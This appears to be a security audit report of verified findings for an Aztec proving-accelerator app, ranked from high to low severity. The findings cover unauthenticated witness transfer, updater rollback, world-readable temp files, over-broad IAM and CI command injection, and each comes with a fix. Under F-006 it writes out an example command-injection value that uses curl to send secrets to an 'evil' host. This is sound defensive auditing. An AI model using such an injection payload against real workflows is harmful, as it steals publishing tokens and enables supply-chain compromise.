# Verified Findings (Phase 4)

Verifier: Fable (main), independent source re-read per finding before trusting the raw claim. Order: HIGH → MEDIUM → LOW.

## HIGH

### F-001 — SDK ships the private witness to an unauthenticated local server — CONFIRMED (high)
- Re-read `accelerator-transport.ts:112-149`, `accelerator-prover.ts:177,194,262,273,299,309`. The `/health` probe accepts any parseable JSON as "available" (a bare `{}` reaches the legacy success path), pins the winning protocol, and `createChonkProof` then POSTs the msgpack witness to that endpoint. No certificate pin, no shared secret, no server attestation. Even a version-mismatch (`needsDownload`) proceeds to send. Both models converged independently.
- Impact: a local process that binds `127.0.0.1:59833` before the real app receives the crown-jewel witness (deanonymizes a private tx). AV local, PR low, UI none (dApp-triggered), C:high.
- Fix: authenticate the server before sending witness — pin the accelerator's self-signed cert / public key, or a per-install shared token exchanged out-of-band; treat unrecognized/legacy versions as NOT-available rather than proceeding.

### F-004 — Updater rollback via feed `version` unbound from signed artifact — CONFIRMED (high)
- Re-read `updater.rs:27,39-56,126-137,170`. The feed's `version` drives the "is-newer?" decision but is never checked against the downloaded (validly-signed, possibly older) artifact; no monotonic rollback floor. minisign authenticates *bytes*, not *version→artifact* binding, so a feed advertising `version: 999.0.0` while serving an old signed build passes. Both models converged.
- Caveat: some platform installers (e.g. MSI) enforce their own downgrade protection; impact is platform-dependent, but macOS/generic paths accept it and auto-update users get zero prompt.
- Fix: after download, assert the artifact's embedded version == feed `version` AND > installed version; maintain an app-side monotonic floor. Couple with F-005 (protect the feed).

## MEDIUM

### F-002 — Spoofable incumbent-probe evicts the real accelerator (Windows) — CONFIRMED (high)
- `probe.rs:14-17,24-44` classifies "healthy Aztec" from only `status=="ok"` + `api_version==1` (public, forgeable); `main.rs` exits(0) on positive probe. A squatter answering `/health` makes the real app quit, keeping the port — which F-001's SDK then trusts. Both converged. Windows-path + timing → Medium; couples with F-001 to a full witness-redirect chain.
- Fix: authenticate the incumbent (per-install secret / named-pipe identity / signed challenge) before self-terminating.

### F-003 — Witness written to a world-readable temp file — CONFIRMED (high, umask-dependent)
- `bb.rs:86-90`: `tempfile::tempdir()?` then `std::fs::write(&input_path, ivc_inputs)`. **Verified against tempfile 3.27.0 upstream** (`src/dir/imp/unix.rs::create`): the directory mode is set ONLY when the caller passes explicit `permissions`; `tempdir()` passes `None`, so the dir is created with `DirBuilder::new()` = umask-default (**~0o755**, world-traversable). The file via `std::fs::write` = **~0o644**. Contrast `config.rs`/`certs.rs`, which correctly force 0o700/0o600. On a default-umask multi-user host, any local user reads `ivc-inputs.msgpack` (plaintext witness) for the proving window (≤5 min). Neutralized only by a hardened umask (077).
- Relevance: the user runs many agents/processes on one homelab host — exactly the multi-tenant condition.
- Fix: `tempfile::Builder::new().permissions(Permissions::from_mode(0o700)).tempdir()` and write the file 0o600 (or place under the app's 0o700 data dir).

### F-005 — Over-broad deploy trust reaches the update feed — CONFIRMED (high); framed for solo-repo threat model
- `iam.tf:32-38` OIDC `sub` StringLike includes `refs/heads/chore/aztec-nightlies-*` and `chore/aztec-stable-*`; `main-branch-protection.json` covers only `main` (and `main` requires 0 approvals); `iam.tf:53-72` grants `s3:PutObject/DeleteObject` over the WHOLE bucket + CloudFront invalidation, shared by 4 pipelines. Any actor who can push a matching branch and run a workflow with `id-token: write` assumes the deploy role and can overwrite `landing/releases/latest.json` (→ F-004) or deface `landing/`/`playground/`.
- Threat-model note (tempers Codex's "any repo writer"): this is a single-owner public repo, so "repo writer" = the owner or a compromised owner/CI token, not an anonymous external attacker. This is a blast-radius / least-privilege finding, not remote RCE. minisign still blocks arbitrary-code installs; the reachable damage is rollback (via F-004), update-feed DoS, and site defacement/phishing.
- Fix: scope OIDC `sub` to protected refs only; protect `nightlies` + the `chore/aztec-*` namespace; split S3 write by prefix per pipeline (releases/ vs landing/ vs playground/); require ≥1 review on `main`.

### F-006 — `_publish-sdk.yml` command injection via `dist_tag` — CONFIRMED (high)
- Read `_publish-sdk.yml`: line 101 `run: npm publish ... --tag ${{ inputs.dist_tag }} ...` (unquoted, `NODE_AUTH_TOKEN=secrets.NPM_TOKEN` in env); line 124 places `${{ inputs.dist_tag }}` inside a double-quoted `NOTES=` in a step carrying `GH_TOKEN`. GitHub expands the expression before bash runs, so `dist_tag = "x; curl -d @- https://evil …"` (or a backtick/`$()` variant) executes with the tokens present. `workflow_dispatch` makes it directly runnable by any write/dispatch-capable actor.
- Fix: pass `dist_tag` via `env:` and reference `"$DIST_TAG"` quoted; validate against `^[a-z0-9._-]+$`.

### F-007 — Unverified `download-bb.ts` poisons the runtime-trusted cache — CONFIRMED (high)
- `scripts/download-bb.ts:32-106` fetches + `tar -xzf` with zero digest/signature check into `~/.aztec-accelerator/versions/{version}/bb` — the same layout `cache_layout.rs` defines and `find_bb`/`prove.rs:75` execute on a cache hit WITHOUT re-running `downloader.rs::verify_digest`. Both models converged. `package.json` exposes it as `bb:download`, so devs/CI run it; a compromised/MITM'd tarball for a version becomes a trusted cached binary that later reads the witness via `--ivc_inputs_path`.
- Fix: mirror the Rust fail-closed SHA-256 check in `download-bb.ts`, or have the runtime record+verify a digest marker on every cache hit rather than trusting file existence.

### F-008 — Windows `bb.exe` trust-on-first-use auto-pin — CONFIRMED (high)
- `update-aztec-version.ts:79-93,137` hashes whatever the release URL returns and writes it into `copy-bb.ts`'s `WINDOWS_BB_CHECKSUMS`; `copy-bb.ts:56-148` then "verifies" against that self-derived pin. With 0 required reviews the auto-pin merges unreviewed. A compromised upstream asset at pin-time is blessed and shipped to all Windows users of that release (the shipped `bb.exe` processes witnesses).
- Fix: derive the pin from an independent source (signed checksums / second mirror / reproducible build), and require human review of checksum diffs.

### F-009 — `/prove` buffers body before the semaphore (memory DoS) — CONFIRMED (high)
- `prove.rs:110` authorize → `:112` `to_bytes(raw_body, 50MB)` → `:121` `prove_semaphore.acquire()`. The concurrency gate is AFTER buffering, so N concurrent approved-origin (or local no-Origin) requests each hold up to 50MB before queuing → GBs resident, app/session instability. Verified ordering directly.
- Fix: acquire the permit (or a bounded memory budget / connection cap) before buffering; or stream to the temp file under the permit.

## LOW

### F-010 — Linux systemd unit-path injection — CONFIRMED (moderate)
- `crash_recovery.rs` formats `ExecStart="{current_exe()}"` with no systemd escaping; the Windows sibling XML-escapes. Injection needs the app to run from an attacker-named path containing quotes/newlines/`%` — unusual for standard installs → Low. Fix: reject control chars in the path / use `systemd-escape` semantics (Windows already escapes).

### F-011 — Trailing-dot origin collapse — CONFIRMED code, LOW exploitability
- `authorization.rs:37` `host.trim_end_matches('.')` merges `https://x.` into approved `https://x` (RFC-6454-distinct). Exploit needs the attacker to serve *distinct* content at the dotted FQDN of an approved site — normally the same DNS record/server answers, so rarely controllable → Low. Fix: reject trailing-dot origins (or don't strip) so they require their own approval.

### F-012 — Global Tauri IPC + no CSP (defense-in-depth) — CONFIRMED architecture, no current vector
- All commands in one global `invoke_handler`; `tauri.conf.json` sets no `app.security.csp`, `withGlobalTauri: true`. No injection sink exists today (frontend is `textContent`/`createElement` only), so not currently exploitable — but any future webview XSS would reach `respond_auth`/`remove_approved_origin`/`set_auto_update`. Fix: set a strict CSP, drop `withGlobalTauri`, scope commands per-window.

### F-013 — Headless localhost auto-approve bypasses `ALLOWED_ORIGINS` — CONFIRMED (documented)
- `server/src/main.rs:78` hardcodes `auto_approve_localhost: true` in gated mode (documented SEC-04/R13). Any localhost-claiming origin (any port) skips the operator allowlist — a real gap on multi-tenant/CI hosts where other local processes exist. Low (documented intent). Fix: make localhost auto-approve an explicit opt-in for headless.

### F-014 — Authorize-popup origin overflow — CONFIRMED (downgraded)
- `authorize.html:20,38` + `style.css`: `.popup-detail` uses `word-break: break-all; max-width:100%` inside `.popup-container { height: calc(100vh-40px) }` with no scroll. A long origin WRAPS (all chars present) but overflows the fixed-height popup, vertically clipping the origin box and/or pushing the buttons off-screen; "Remember" is pre-checked. Not the clean horizontal truncation the raw finding implied → Low. Fix: cap origin length with a middle-ellipsis that preserves the registrable domain, make the popup scroll, and default "Remember" unchecked.

### F-015 — Mutable-tag Action pinning — CONFIRMED (low)
- Third-party actions pinned by major tag (incl. `aws-actions/configure-aws-credentials@v6`, which mints the deploy session) while `create-github-app-token` is SHA-pinned. A compromised tag steals the OIDC/AWS session. Fix: SHA-pin all third-party actions.

### F-016 — CA key not explicitly zeroized — CONFIRMED enabled-but-uninvoked; moderate confidence
- `certs.rs` never calls `.zeroize()`; `Cargo.toml` enables rcgen's `zeroize` feature. Whether rcgen 0.13's Drop fully scrubs the `ring`/`aws-lc` backed key material (vs only outer DER) is not verifiable from this repo; impact requires local process-memory read (ptrace/core/swap) — already high privilege — and the CA is NameConstraint-scoped to localhost. Low. Fix: wrap key material in `Zeroizing` / confirm rcgen ZeroizeOnDrop coverage; document the residual window.
